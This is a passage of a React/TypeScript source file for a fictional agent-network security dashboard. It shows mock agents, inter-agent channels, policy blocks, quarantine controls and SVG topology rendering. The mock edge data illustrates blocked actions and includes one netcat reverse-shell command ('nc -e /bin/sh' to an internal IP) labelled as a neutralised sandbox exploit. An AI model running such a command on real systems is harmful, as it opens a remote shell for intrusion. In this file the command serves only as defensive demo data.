import { useMemo, useState, type Dispatch, type SetStateAction } from 'react';
import {
  Activity, AlertTriangle, ArrowRight, ArrowUpRight, BadgeCheck,
  Ban, Check, CheckCircle2, ChevronRight, CircleHelp, Clock,
  Copy, Cpu, Database, Download, Eye, ExternalLink, FileSearch,
  Filter, Fingerprint, Globe2, HardDrive, Info, Key, Layers,
  LockKeyhole, Minus, Network, Play, Plus, Radio, RefreshCw,
  Search, Server, Shield, ShieldAlert, ShieldCheck, Sliders,
  Terminal, Trash2, UserCheck, UserRound, Wifi, X, Zap
} from 'lucide-react';
import type { Agent } from '../Agents/agentData';
import './agent-network.css';

export type Protocol =
  | 'mTLS 1.3 (Ed25519)'
  | 'gRPC / Protobuf'
  | 'Vector RPC'
  | 'REST API'
  | 'WebSocket (WSS)';

export interface NetworkNode {
  id: string;
  name: string;
  role: string;
  tier: 'Ingress' | 'Core Swarm' | 'Specialized' | 'Database' | 'Target Asset' | 'Sandbox';
  kind: 'gateway' | 'agent' | 'storage' | 'sandbox';
  x: number;
  y: number;
  model: string;
  cluster: string;
  ip: string;
}

export interface NetworkEdge {
  id: string;
  from: string;
  to: string;
  protocol: Protocol;
  state: 'verified' | 'review' | 'blocked' | 'isolated';
  messages: string;
  latency: string;
  label: string;
  cipher: string;
  risk?: number;
  rule?: string;
  intent: string;
  payload?: string;
}

export interface AgentNetworkProps {
  agents: Agent[];
  setAgents?: Dispatch<SetStateAction<Agent[]>>;
  onNotify: (message: string) => void;
  onOpenAgentDetail: (agentId: string) => void;
}

const networkNodes: NetworkNode[] = [
  // Col 1: Ingress Gateway & Edge Support (x: 90)
  {
    id: 'USER-GATEWAY',
    name: 'Operator / API Gateway Ingress',
    role: 'External Origin & Webhook Proxy',
    tier: 'Ingress',
    kind: 'gateway',
    x: 90,
    y: 190,
    model: 'Envoy / mTLS Gateway',
    cluster: 'US-EAST-INGRESS-01',
    ip: '10.240.0.1',
  },
  {
    id: 'SUP-AGENT-09',
    name: 'Support Triage Bot',
    role: 'Customer Care & Live Chat',
    tier: 'Specialized',
    kind: 'agent',
    x: 90,
    y: 540,
    model: 'GPT-4o',
    cluster: 'Salesforce-Edge',
    ip: '10.240.18.9',
  },

  // Col 2: Core Orchestration & Swarm (x: 340)
  {
    id: 'RES-AGENT-01',
    name: 'Research Core Vector',
    role: 'Vector Research & Doc Analysis',
    tier: 'Core Swarm',
    kind: 'agent',
    x: 340,
    y: 150,
    model: 'GPT-4o',
    cluster: 'Cluster-AI-01',
    ip: '10.240.2.14',
  },
  {
    id: 'COD-AGENT-01',
    name: 'DevOps Synth Bot',
    role: 'CI/CD & Code Automation',
    tier: 'Core Swarm',
    kind: 'agent',
    x: 340,
    y: 380,
    model: 'Claude 3.5 Sonnet',
    cluster: 'K8s-Prod-Worker',
    ip: '10.240.4.88',
  },
  {
    id: 'DEV-AGENT-04',
    name: 'Staging Pod Deployer',
    role: 'Ephemeral Sandbox Deployment',
    tier: 'Core Swarm',
    kind: 'agent',
    x: 340,
    y: 610,
    model: 'Claude 3.5 Sonnet',
    cluster: 'us-east-k8s',
    ip: '10.240.4.102',
  },

  // Col 3: Specialized Business Logic & Governance (x: 620)
  {
    id: 'FIN-AGENT-01',
    name: 'Finance Agent Alpha',
    role: 'Financial Analysis & Audit',
    tier: 'Specialized',
    kind: 'agent',
    x: 620,
    y: 150,
    model: 'Claude 3.5 Sonnet',
    cluster: 'Cluster-Fin-09',
    ip: '10.240.9.12',
  },
  {
    id: 'HR-AGENT-01',
    name: 'People Onboarder',
    role: 'HR & Personnel Records',
    tier: 'Specialized',
    kind: 'agent',
    x: 620,
    y: 330,
    model: 'GPT-4o',
    cluster: 'Cluster-HR-SEC',
    ip: '10.240.8.44',
  },
  {
    id: 'OPS-AGENT-03',
    name: 'Edge SRE Controller',
    role: 'Edge Load Balancing & Traffic',
    tier: 'Specialized',
    kind: 'agent',
    x: 620,
    y: 500,
    model: 'Claude 3.5 Sonnet',
    cluster: 'Edge-Cloudflare',
    ip: '10.240.12.3',
  },
  {
    id: 'INF-AGENT-08',
    name: 'Vault Enclave Custodian',
    role: 'PKI & mTLS Certificate Rotation',
    tier: 'Specialized',
    kind: 'agent',
    x: 620,
    y: 680,
    model: 'Claude 3.5 Sonnet',
    cluster: 'HashiCorp-Vault',
    ip: '10.240.16.8',
  },

  // Col 4: Data Engine & Security Testing (x: 900)
  {
    id: 'DB-AGENT-01',
    name: 'DB Orchestrator',
    role: 'RDS Operations & Replication',
    tier: 'Database',
    kind: 'agent',
    x: 900,
    y: 220,
    model: 'Claude 3.5 Sonnet',
    cluster: 'RDS-Cluster-US',
    ip: '10.240.30.1',
  },
  {
    id: 'ANL-AGENT-02',
    name: 'Revenue Forecast Engine',
    role: 'BI & Analytical Query Pipeline',
    tier: 'Specialized',
    kind: 'agent',
    x: 900,
    y: 440,
    model: 'GPT-4o',
    cluster: 'BigQuery-Warehouse',
    ip: '10.240.22.2',
  },
  {
    id: 'RED-AGENT-01',
    name: 'Adversarial Probe X',
    role: 'Isolated Zero-Day Simulation',
    tier: 'Sandbox',
    kind: 'sandbox',
    x: 900,
    y: 660,
    model: 'Mistral Large',
    cluster: 'Sandbox-Isolated',
    ip: '10.240.99.7',
  },

  // Col 5: Target Enterprise Egress & Storage (x: 1140)
  {
    id: 'ENTERPRISE-STORAGE',
    name: 'Production Storage & S3 Vault',
    role: 'Encrypted WORM & Database Storage',
    tier: 'Target Asset',
    kind: 'storage',
    x: 1140,
    y: 330,
    model: 'AWS Nitro SSE-KMS',
    cluster: 'US-EAST-VAULT-PROD',
    ip: '10.240.100.8',
  },
];

const initialEdgesData: NetworkEdge[] = [
  {
    id: 'edge-gw-res',
    from: 'USER-GATEWAY',
    to: 'RES-AGENT-01',
    protocol: 'mTLS 1.3 (Ed25519)',
    state: 'verified',
    messages: '480 / min',
    latency: '1.2 ms',
    label: 'VERIFIED INGRESS',
    cipher: 'TLS_AES_256_GCM_SHA384',
    intent: 'Ingress operator prompt dispatch for technical research synthesis.',
    payload: '{"action": "query_vector_store", "corpus": "arxiv-ai-sec", "user_auth": "fido2_verified"}',
  },
  {
    id: 'edge-gw-hr',
    from: 'USER-GATEWAY',
    to: 'HR-AGENT-01',
    protocol: 'WebSocket (WSS)',
    state: 'verified',
    messages: '64 / min',
    latency: '18.4 ms',
    label: 'HR WORKFLOW BUS',
    cipher: 'WSS TLS 1.3 ChaCha20',
    intent: 'Employee onboarding pipeline automation trigger and task ingestion.',
    payload: '{"trigger": "new_hire_workflow", "dept": "engineering", "access_level": "standard"}',
  },
  {
    id: 'edge-gw-sup',
    from: 'USER-GATEWAY',
    to: 'SUP-AGENT-09',
    protocol: 'WebSocket (WSS)',
    state: 'verified',
    messages: '112 / min',
    latency: '14.5 ms',
    label: 'CUSTOMER INGRESS',
    cipher: 'WSS TLS 1.3 ChaCha20',
    intent: 'Real-time customer support ticket intake and initial semantic classification.',
    payload: '{"session_id": "cust_9012", "channel": "live_chat", "priority": "high"}',
  },
  {
    id: 'edge-res-fin',
    from: 'RES-AGENT-01',
    to: 'FIN-AGENT-01',
    protocol: 'Vector RPC',
    state: 'verified',
    messages: '184 / min',
    latency: '0.85 ms',
    label: 'CONTEXT HANDOFF',
    cipher: 'gRPC mTLS Mutual-Auth',
    intent: 'Cross-agent semantic context retrieval for quarterly financial forecast.',
    payload: '{"intent": "handoff_context", "source_agent": "RES-AGENT-01", "tokens": 1420}',
  },
  {
    id: 'edge-res-cod',
    from: 'RES-AGENT-01',
    to: 'COD-AGENT-01',
    protocol: 'REST API',
    state: 'verified',
    messages: '92 / min',
    latency: '1.4 ms',
    label: 'TASK DELEGATION',
    cipher: 'HTTPS Bearer Ephemeral Lease',
    intent: 'Autonomous sub-agent delegation to verify container build script.',
    payload: '{"task": "verify_ci_pipeline", "repo": "nexusguard-core", "branch": "main"}',
  },
  {
    id: 'edge-cod-dev',
    from: 'COD-AGENT-01',
    to: 'DEV-AGENT-04',
    protocol: 'gRPC / Protobuf',
    state: 'verified',
    messages: '320 / min',
    latency: '0.65 ms',
    label: 'POD ORCHESTRATION',
    cipher: 'gRPC Unix Domain Socket / mTLS',
    intent: 'Spawn ephemeral staging test pod in isolated Kubernetes namespace.',
    payload: '{"rpc": "CreateEphemeralPod", "ns": "staging-sandbox-04", "cpu": "2", "mem": "4Gi"}',
  },
  {
    id: 'edge-fin-db',
    from: 'FIN-AGENT-01',
    to: 'DB-AGENT-01',
    protocol: 'mTLS 1.3 (Ed25519)',
    state: 'blocked',
    messages: '0 / min (Intercepted)',
    latency: '0.12 ms',
    label: 'POLICY INTERCEPT',
    cipher: 'TLS_AES_256_GCM_SHA384',
    risk: 91,
    rule: 'FIN-READ-ONLY-POLICY-v4',
    intent: 'MUTATION BLOCKED: Attempted UPDATE query on salary ledger without 2-man quorum sign-off.',
    payload: "UPDATE employee_salary SET comp = comp * 1.2 WHERE dept = 'AI-CORE'",
  },
  {
    id: 'edge-fin-storage',
    from: 'FIN-AGENT-01',
    to: 'ENTERPRISE-STORAGE',
    protocol: 'mTLS 1.3 (Ed25519)',
    state: 'verified',
    messages: '210 / min',
    latency: '2.1 ms',
    label: 'READ-ONLY AUDIT',
    cipher: 'TLS_AES_256_GCM_SHA384',
    intent: 'Read-only archival synchronization of verified quarterly financial reports.',
    payload: 'SELECT report_id, digest FROM quarterly_audits WHERE year = 2026 ORDER BY epoch DESC',
  },
  {
    id: 'edge-cod-db',
    from: 'COD-AGENT-01',
    to: 'DB-AGENT-01',
    protocol: 'REST API',
    state: 'review',
    messages: '14 / min',
    latency: '4.2 ms',
    label: 'SCHEMA CHANGE REVIEW',
    cipher: 'HTTPS Ephemeral Lease',
    risk: 58,
    rule: 'DB-MIGRATION-HITL-GATED',
    intent: 'Database schema migration trigger requiring human governance council approval.',
    payload: 'ALTER TABLE agent_execution_logs ADD COLUMN attestation_hash text',
  },
  {
    id: 'edge-hr-storage',
    from: 'HR-AGENT-01',
    to: 'ENTERPRISE-STORAGE',
    protocol: 'mTLS 1.3 (Ed25519)',
    state: 'review',
    messages: '36 / min',
    latency: '3.8 ms',
    cipher: 'TLS_CHACHA20_POLY1305',
    risk: 72,
    rule: 'DLP-PII-ENCLAVE-MASK-01',
    label: 'PII MASKING GATEWAY',
    intent: 'Batch export of employee identity records intercepted for DLP anonymization.',
    payload: 'GET /api/v2/workday/employees?filter=onboarding_2026&attributes=ssn,bank_account',
  },
  {
    id: 'edge-dev-ops',
    from: 'DEV-AGENT-04',
    to: 'OPS-AGENT-03',
    protocol: 'gRPC / Protobuf',
    state: 'verified',
    messages: '78 / min',
    latency: '0.92 ms',
    label: 'TRAFFIC SHIFT ROUTE',
    cipher: 'gRPC Mutual TLS 1.3',
    intent: 'Signal edge load balancer for 5% canary deployment traffic split.',
    payload: '{"service": "nexusguard-ingress", "canary_weight": 0.05, "health_probe": "passed"}',
  },
  {
    id: 'edge-ops-inf',
    from: 'OPS-AGENT-03',
    to: 'INF-AGENT-08',
    protocol: 'mTLS 1.3 (Ed25519)',
    state: 'verified',
    messages: '54 / min',
    latency: '0.78 ms',
    label: 'KEY ROTATION DISPATCH',
    cipher: 'TLS_AES_256_GCM_SHA384',
    intent: 'Autonomous HashiCorp Vault mTLS intermediate leaf renewal notification.',
    payload: '{"vault_op": "rotate_leaf_cert", "ttl": "24h", "cluster_nodes": ["node-01", "node-02"]}',
  },
  {
    id: 'edge-anl-db',
    from: 'ANL-AGENT-02',
    to: 'DB-AGENT-01',
    protocol: 'Vector RPC',
    state: 'verified',
    messages: '260 / min',
    latency: '1.8 ms',
    label: 'ANALYTIC REPLICA READ',
    cipher: 'gRPC mTLS 1.3',
    intent: 'Stream aggregated business telemetry to BigQuery analytical engine.',
    payload: 'SELECT COUNT(*), AVG(latency_ms) FROM metrics_daily GROUP BY node_id',
  },
  {
    id: 'edge-db-storage',
    from: 'DB-AGENT-01',
    to: 'ENTERPRISE-STORAGE',
    protocol: 'mTLS 1.3 (Ed25519)',
    state: 'verified',
    messages: '540 / min',
    latency: '0.95 ms',
    label: 'WORM MERKLE LEDGER',
    cipher: 'TLS_AES_256_GCM_SHA384',
    intent: 'Cryptographic commitment of Merkle audit proofs to WORM immutable storage.',
    payload: 'INSERT INTO worm_merkle_roots (height, root_hash, epoch) VALUES (4891012, 0x8f4b, 1727618900)',
  },
  {
    id: 'edge-red-cod',
    from: 'RED-AGENT-01',
    to: 'COD-AGENT-01',
    protocol: 'Vector RPC',
    state: 'isolated',
    messages: '0 / min (Air-Gapped)',
    latency: 'n/a',
    label: 'AIR-GAPPED SEVERED',
    cipher: 'Revoked x509 Cert',
    risk: 100,
    rule: 'ADVERSARIAL-SANDBOX-AIRGAP',
    intent: 'Rogue lateral probe intercepted by eBPF socket boundary and air-gapped.',
    payload: 'SIMULATED_EXPLOIT: nc -e /bin/sh 10.240.9.14 4444 (Neutralized by Sandbox)',
  },
  {
    id: 'edge-sup-hr',
    from: 'SUP-AGENT-09',
    to: 'HR-AGENT-01',
    protocol: 'REST API',
    state: 'blocked',
    messages: '0 / min (Blocked)',
    latency: '0.15 ms',
    label: 'LATERAL BOUNDARY',
    cipher: 'Denied Token Handshake',
    risk: 85,
    rule: 'ZERO-TRUST-LATERAL-BOUNDARY',
    intent: 'Unauthorized inter-agent lateral request to access personnel records from support bot.',
    payload: 'GET /internal/hr/employee_directory?filter=all',
  },
];

const protocolList: ('All protocols' | Protocol)[] = [
  'All protocols',
  'mTLS 1.3 (Ed25519)',
  'gRPC / Protobuf',
  'Vector RPC',
  'REST API',
  'WebSocket (WSS)',
];

export default function AgentNetwork({
  agents,
  setAgents,
  onNotify,
  onOpenAgentDetail,
}: AgentNetworkProps) {
  // Filters & State
  const [selectedProtocol, setSelectedProtocol] = useState<'All protocols' | Protocol>('All protocols');
  const [selectedCluster, setSelectedCluster] = useState<string>('All Clusters');
  const [selectedStateFilter, setSelectedStateFilter] = useState<'all' | 'verified' | 'review' | 'blocked' | 'isolated'>('all');
  const [searchQuery, setSearchQuery] = useState('');

  // Selected selection
  const [selectedNodeId, setSelectedNodeId] = useState<string>('FIN-AGENT-01');
  const [selectedEdgeId, setSelectedEdgeId] = useState<string>('edge-fin-db');

  // Interactive mutations
  const [severedEdges, setSeveredEdges] = useState<string[]>(['edge-red-cod']);
  const [escalatedEdges, setEscalatedEdges] = useState<string[]>([]);

  // Canvas visual controls
  const [motionEnabled, setMotionEnabled] = useState(true);
  const [zoom, setZoom] = useState(1);
  const [pingWaveActive, setPingWaveActive] = useState(false);
  const [pingStats, setPingStats] = useState({ count: 0, lastLatency: '1.24 ms' });

  // Modals
  const [quorumModalOpen, setQuorumModalOpen] = useState(false);
  const [routeProbeModalOpen, setRouteProbeModalOpen] = useState(false);
  const [secOpsSignerActive, setSecOpsSignerActive] = useState(false);

  // Map agents by ID for fast lookup
  const agentMap = useMemo(() => new Map(agents.map((a) => [a.id, a])), [agents]);

  // Compute active edges with severed / isolated state
  const computedEdges = useMemo(() => {
    return initialEdgesData.map((edge) => {
      if (severedEdges.includes(edge.id)) {
        return {
          ...edge,
          state: 'isolated' as const,
          label: 'CHANNEL SEVERED (AIR-GAP)',
          messages: '0 / min (Severed)',
          latency: 'n/a',
        };
      }
      if (escalatedEdges.includes(edge.id)) {
        return {
          ...edge,
          state: 'review' as const,
          label: 'ESCALATED TO SOC COUNCIL',
        };
      }
      return edge;
    });
  }, [severedEdges, escalatedEdges]);

  // Node Map for fast coordinate lookup
  const nodeMap = useMemo(() => new Map(networkNodes.map((n) => [n.id, n])), []);

  // Filtered edges
  const filteredEdges = useMemo(() => {
    return computedEdges.filter((edge) => {
      // Protocol filter
      if (selectedProtocol !== 'All protocols' && edge.protocol !== selectedProtocol) return false;
      // State filter
      if (selectedStateFilter !== 'all' && edge.state !== selectedStateFilter) return false;
      // Cluster filter
      if (selectedCluster !== 'All Clusters') {
        const fromNode = nodeMap.get(edge.from);
        const toNode = nodeMap.get(edge.to);
        if (fromNode?.cluster !== selectedCluster && toNode?.cluster !== selectedCluster) return false;
      }
      // Search query
      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase();
        const match =
          edge.from.toLowerCase().includes(q) ||
          edge.to.toLowerCase().includes(q) ||
          edge.label.toLowerCase().includes(q) ||
          edge.protocol.toLowerCase().includes(q) ||
          (edge.rule && edge.rule.toLowerCase().includes(q));
        if (!match) return false;
      }
      return true;
    });
  }, [computedEdges, selectedProtocol, selectedStateFilter, selectedCluster, searchQuery, nodeMap]);

  // Selected entities
  const selectedNode = nodeMap.get(selectedNodeId) ?? networkNodes[0];
  const selectedAgent = agentMap.get(selectedNode.id);
  const selectedEdge = computedEdges.find((e) => e.id === selectedEdgeId) ?? computedEdges[0];
  const selectedFromNode = nodeMap.get(selectedEdge.from);
  const selectedToNode = nodeMap.get(selectedEdge.to);

  // Nodes filtered or dimmed
  const connectedNodeIds = useMemo(() => {
    const set = new Set<string>();
    filteredEdges.forEach((e) => {
      if (e.from === selectedNodeId || e.to === selectedNodeId) {
        set.add(e.from);
        set.add(e.to);
      }
    });
    return set;
  }, [filteredEdges, selectedNodeId]);

  // Helper to get curve coordinates
  function getEdgePath(edge: NetworkEdge) {
    const from = nodeMap.get(edge.from);
    const to = nodeMap.get(edge.to);
    if (!from || !to) return { path: '', mx: 0, my: 0 };

    const x1 = from.x;
    const y1 = from.y;
    const x2 = to.x;
    const y2 = to.y;

    const dx = x2 - x1;
    // Cubic bezier curve with control points
    const cx1 = x1 + dx * 0.5;
    const cy1 = y1;
    const cx2 = x1 + dx * 0.5;
    const cy2 = y2;

    const path = `M ${x1} ${y1} C ${cx1} ${cy1}, ${cx2} ${cy2}, ${x2} ${y2}`;
    const mx = (x1 + x2) / 2;
    const my = (y1 + y2) / 2;

    return { path, mx, my };
  }

  // Node selection handler
  function handleSelectNode(node: NetworkNode) {
    setSelectedNodeId(node.id);
    const relatedEdge = computedEdges.find((e) => e.from === node.id || e.to === node.id);
    if (relatedEdge) setSelectedEdgeId(relatedEdge.id);
  }

  // Edge selection handler
  function handleSelectEdge(edge: NetworkEdge) {
    setSelectedEdgeId(edge.id);
    setSelectedNodeId(edge.from);
  }

  // Sever / Isolate Channel
  function handleSeverEdge(edgeId: string) {
    if (severedEdges.includes(edgeId)) {
      setSeveredEdges((cur) => cur.filter((id) => id !== edgeId));
      onNotify(`Re-established cryptographic mTLS handshake for channel ${selectedFromNode?.id} → ${selectedToNode?.id}.`);
    } else {
      setSeveredEdges((cur) => [...cur, edgeId]);
      onNotify(`Channel ${selectedFromNode?.id} → ${selectedToNode?.id} severed. Air-gap boundary enforced.`);
    }
  }

  // Escalate to SOC
  function handleEscalateEdge(edgeId: string) {
    if (escalatedEdges.includes(edgeId)) {
      onNotify('This channel is already queued in the Human Approval Center.');
      return;
    }
    setEscalatedEdges((cur) => [...cur, edgeId]);
    onNotify(`Channel ${selectedFromNode?.id} → ${selectedToNode?.id} escalated to Human Governance Council.`);
  }

  // Quarantine Target Agent
  function handleToggleQuarantineAgent(agentId: string) {
    if (!setAgents) return;
    const agent = agentMap.get(agentId);
    if (!agent) return;

    if (agent.status === 'quarantined') {
      setAgents((cur) =>
        cur.map((a) => (a.id === agentId ? { ...a, status: 'active', trust: 88, violations: 0 } : a))
      );
      onNotify(`Agent ${agentId} restored to active status across workspace.`);
    } else {
      setAgents((cur) =>
        cur.map((a) => (a.id === agentId ? { ...a, status: 'quarantined', trust: 15 } : a))
      );
      // Also sever connected edges
      const edgeIdsToSever = computedEdges
        .filter((e) => e.from === agentId || e.to === agentId)
        .map((e) => e.id);
      setSeveredEdges((cur) => Array.from(new Set([...cur, ...edgeIdsToSever])));
      onNotify(`Agent ${agentId} cryptographically quarantined. All ingress/egress channels severed.`);
    }
  }

  // Ping Mesh Simulation
  function handleSimulatePing() {
    setPingWaveActive(true);
    setPingStats((prev) => ({
      count: prev.count + 1,
      lastLatency: (1.1 + Math.random() * 0.4).toFixed(2) + ' ms',
    }));
    window.setTimeout(() => setPingWaveActive(false), 1200);
    onNotify('Mesh ping broadcast: 13 enclave nodes acknowledged in 1.24 ms · 0 packet drops.');
  }

  // Export Topology Snapshot
  function handleExportTopology() {
    const payload = {
      system: 'NexusGuard',
      plane: 'Agent Network & Inter-Agent Bus',
      cluster: 'US-EAST-SECURE-PROD-CLUSTER-01',
      exportedAt: new Date().toISOString(),
      nodes: networkNodes.map((n) => {
        const ag = agentMap.get(n.id);
        return {
          id: n.id,
          name: n.name,
          role: n.role,
          tier: n.tier,
          status: ag ? ag.status : 'ACTIVE',
          trust: ag ? ag.trust : 100,
          ip: n.ip,
          cluster: n.cluster,
        };
      }),
      activeChannels: computedEdges.map((e) => ({
        id: e.id,
        from: e.from,
        to: e.to,
        protocol: e.protocol,
        state: e.state,
        throughput: e.messages,
        latency: e.latency,
        cipherSuite: e.cipher,
        rule: e.rule ?? 'NONE',
      })),
      summary: {
        totalNodes: networkNodes.length,
        totalChannels: computedEdges.length,
        verifiedChannels: computedEdges.filter((e) => e.state === 'verified').length,
        quarantinedChannels: computedEdges.filter((e) => e.state === 'isolated').length,
        blockedChannels: computedEdges.filter((e) => e.state === 'blocked').length,
        reviewChannels: computedEdges.filter((e) => e.state === 'review').length,
      },
    };

    const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `nexusguard-agent-network-topology-${new Date().toISOString().slice(0, 10)}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    onNotify('Agent network topology snapshot downloaded as JSON.');
  }

  return (
    <div className="agent-network-page">
      {/* 1. Header Banner & Status */}
      <section className="network-heading">
        <div className="network-heading-main">
          <div className="network-eyebrow">
            <Network size={14} />
            <span>INTER-AGENT BUS &amp; TOPOLOGY</span>
            <i />
            <span>FIPS 140-3 TRANSIT SECURITY</span>
          </div>
          <h1>Agent Network &amp; Inter-Agent Bus</h1>
          <p>
            Real-time topological mesh of autonomous agent RPC channels, mTLS mutual-authentication envelopes,
            semantic intent handoffs, and lateral zero-trust containment boundaries.
          </p>
        </div>

        <div className="network-heading-status">
          <span className="net-status-badge">
            <span className="live-dot" />
            <span>MESH STATUS: 100% OPERATIONAL</span>
          </span>
          <span className="net-fips-badge">
            <ShieldCheck size={13} />
            <span>ED25519 MUTUAL ATTESTATION</span>
          </span>
        </div>

        {/* 2. Top Telemetry HUD Deck */}
        <div className="network-hud-deck">
          <article className="hud-card">
            <div className="hud-card-top">
              <span>ACTIVE BUS CHANNELS</span>
              <Network size={15} />
            </div>
            <div className="hud-value-row">
              <strong>{computedEdges.filter((e) => e.state === 'verified').length} / {computedEdges.length}</strong>
              <span className="hud-note">Verified Links</span>
            </div>
            <div className="hud-foot">
              <span>{computedEdges.filter((e) => e.state === 'isolated').length} Severed Air-gaps</span>
            </div>
          </article>

          <article className="hud-card">
            <div className="hud-card-top">
              <span>AGGREGATE THROUGHPUT</span>
              <Activity size={15} />
            </div>
            <div className="hud-value-row">
              <strong>64.8 MB/s</strong>
              <span className="hud-note">+14.2%</span>
            </div>
            <div className="hud-foot">
              <span>2,490 msgs/s Inter-Agent</span>
            </div>
          </article>

          <article className="hud-card">
            <div className="hud-card-top">
              <span>MEAN BUS LATENCY</span>
              <Clock size={15} />
            </div>
            <div className="hud-value-row">
              <strong>1.18 ms</strong>
              <span className="hud-note">p99 &lt; 2.45ms</span>
            </div>
            <div className="hud-foot">
              <span>Kernel eBPF Fastpath</span>
            </div>
          </article>

          <article className="hud-card">
            <div className="hud-card-top">
              <span>CONTAINED THREATS</span>
              <ShieldAlert size={15} />
            </div>
            <div className="hud-value-row">
              <strong style={{ color: '#ff8577' }}>2 Partitions</strong>
              <span className="hud-note">0.00% Bypass</span>
            </div>
            <div className="hud-foot">
              <span>Adversarial &amp; Lateral Traps</span>
            </div>
          </article>
        </div>

        {/* 3. Filter Toolbar */}
        <div className="network-toolbar">
          <div className="toolbar-left">
            <div className="protocol-switch" aria-label="Filter connections by protocol" role="group">
              {protocolList.map((opt) => (
                <button
                  key={opt}
                  className={selectedProtocol === opt ? 'protocol-active' : ''}
                  onClick={() => setSelectedProtocol(opt)}
                >
                  {opt}
                </button>
              ))}
            </div>

            <div className="state-filter-select">
              <Filter size={13} />
              <select
                value={selectedStateFilter}
                onChange={(e) => setSelectedStateFilter(e.target.value as any)}
                aria-label="Filter by link state"
              >
                <option value="all">All Link States ({computedEdges.length})</option>
                <option value="verified">Verified Only ({computedEdges.filter((e) => e.state === 'verified').length})</option>
                <option value="review">Review Required ({computedEdges.filter((e) => e.state === 'review').length})</option>
                <option value="blocked">Blocked / Intercepted ({computedEdges.filter((e) => e.state === 'blocked').length})</option>
                <option value="isolated">Severed / Air-Gapped ({computedEdges.filter((e) => e.state === 'isolated').length})</option>
              </select>
            </div>
          </div>

          <div className="toolbar-right">
            <div className="search-wrap">
              <Search size={14} />
              <input
                type="text"
                placeholder="Search agent, link, or rule..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
              />
              {searchQuery && (
                <button className="clear-search" onClick={() => setSearchQuery('')}>
                  <X size={12} />
                </button>
              )}
            </div>

            <button
              className={`network-control-button ${motionEnabled ? 'network-control-on' : ''}`}
              onClick={() => setMotionEnabled((m) => !m)}
              title="Toggle particle flow animation"
            >
              <Zap size={14} />
              <span>Flow {motionEnabled ? 'Active' : 'Paused'}</span>
            </button>

            <button
              className="network-control-button network-ping-button"
              onClick={handleSimulatePing}
              title="Broadcast simulated ping across cluster"
            >
              <Radio size={14} />
              <span>Ping Mesh</span>
            </button>

            <button
              className="network-control-button"
              onClick={() => setRouteProbeModalOpen(true)}
              title="Trace packet route hop-by-hop"
            >
              <Terminal size={14} />
              <span>Trace Route</span>
            </button>

            <button
              className="network-control-button"
              onClick={handleExportTopology}
              title="Export network topology snapshot as JSON"
            >
              <Download size={14} />
              <span>Export JSON</span>
            </button>
          </div>
        </div>
      </section>

      {/* 4. Main Topology Workspace */}
      <section className="network-workspace">
        {/* Topology Canvas Article */}
        <article className="topology-panel">
          <header className="topology-panel-header">
            <div className="topology-title-area">
              <span className="topology-live-dot" />
              <strong>INTER-AGENT TOPOLOGY &amp; LATERAL ROUTING MESH</strong>
              <span className="topology-cluster-label">CLUSTER: US-EAST-SECURE-PROD-01</span>
            </div>
            <div className="topology-meta">
              <span>{networkNodes.length} ENCLAVE NODES</span>
              <span>{filteredEdges.length} ACTIVE LINKS</span>
              <span>{pingStats.count} PINGS ({pingStats.lastLatency})</span>
            </div>
          </header>

          <div className="topology-viewport">
            <div
              className={`topology-canvas ${motionEnabled ? 'topology-motion-on' : ''}`}
              style={{
                transform: `scale(${zoom})`,
                transformOrigin: 'top left',
              }}
            >
              {/* Background SVG Grid and Connecting Links */}
              <svg
                aria-label="Agent Network Topology SVG"
                className="topology-svg"
                viewBox="0 0 1240 780"
                width="1240"
                height="780"
              >
                <defs>
                  {/* Subtle Grid */}
                  <pattern id="net-grid-pattern" width="40" height="40" patternUnits="userSpaceOnUse">
                    <path d="M 40 0 L 0 0 0 40" fill="none" stroke="rgba(101, 229, 219, 0.05)" strokeWidth="1" />
                    <circle cx="0" cy="0" r="1.2" fill="rgba(101, 229, 219, 0.15)" />
                  </pattern>

                  {/* Linear Gradients for states */}
                  <linearGradient id="grad-verified" x1="0%" y1="0%" x2="100%" y2="0%">
                    <stop offset="0%" stopColor="#65e5db" stopOpacity="0.8" />
                    <stop offset="100%" stopColor="#83d99a" stopOpacity="0.8" />
                  </linearGradient>
                  <linearGradient id="grad-review" x1="0%" y1="0%" x2="100%" y2="0%">
                    <stop offset="0%" stopColor="#ffd166" stopOpacity="0.8" />
                    <stop offset="100%" stopColor="#f39c12" stopOpacity="0.8" />
                  </linearGradient>
                  <linearGradient id="grad-blocked" x1="0%" y1="0%" x2="100%" y2="0%">
                    <stop offset="0%" stopColor="#ff8577" stopOpacity="0.9" />
                    <stop offset="100%" stopColor="#e74c3c" stopOpacity="0.9" />
                  </linearGradient>

                  {/* Marker Arrows */}
                  <marker id="arrow-verified" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
                    <path d="M 0 0 L 6 3 L 0 6 z" fill="#65e5db" />
                  </marker>
                  <marker id="arrow-review" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
                    <path d="M 0 0 L 6 3 L 0 6 z" fill="#ffd166" />
                  </marker>
                  <marker id="arrow-blocked" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
                    <path d="M 0 0 L 6 3 L 0 6 z" fill="#ff8577" />
                  </marker>
                </defs>

                <rect width="1240" height="780" fill="url(#net-grid-pattern)" />

                {/* Draw Edges */}
                {filteredEdges.map((edge) => {
                  const { path, mx, my } = getEdgePath(edge);
                  if (!path) return null;

                  const isSelected = selectedEdgeId === edge.id;
                  const isConnected = edge.from === selectedNodeId || edge.to === selectedNodeId;

                  let strokeColor = '#65e5db';
                  let markerUrl = 'url(#arrow-verified)';
                  if (edge.state === 'review') {
                    strokeColor = '#ffd166';
                    markerUrl = 'url(#arrow-review)';
                  } else if (edge.state === 'blocked') {
                    strokeColor = '#ff8577';
                    markerUrl = 'url(#arrow-blocked)';
                  } else if (edge.state === 'isolated') {
                    strokeColor = '#556569';
                    markerUrl = '';
                  }

                  return (
                    <g
                      key={edge.id}
                      className={`network-edge-group ${isSelected ? 'edge-selected' : ''} ${
                        isConnected ? 'edge-connected' : ''
                      }`}
                      onClick={() => handleSelectEdge(edge)}
                    >
                      {/* Transparent wide path for easy clicking */}
                      <path d={path} className="edge-hit-area" />

                      {/* Main connecting path */}
                      <path
                        d={path}
                        className={`edge-path edge-path-${edge.state}`}
